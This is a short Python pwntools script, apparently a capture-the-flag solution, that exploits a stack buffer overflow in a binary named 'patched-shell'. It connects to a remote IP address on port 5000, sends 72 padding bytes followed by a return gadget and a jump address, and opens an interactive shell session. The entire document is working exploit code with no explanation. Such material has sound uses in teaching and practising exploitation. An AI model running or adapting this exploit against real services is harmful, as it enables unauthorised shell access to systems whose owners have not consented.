from pwn import *


p = remote("34.134.173.142",5000)
#p = process("./patched-shell")

# gs = '''
#  '''

# gdb.attach(p,gdbscript=gs)

buf = b'A'* 72 + p64(0x000000000040101a) + p64(0x0000000401136)

# p.recvuntil("")
p.sendline(buf)			

p.interactive()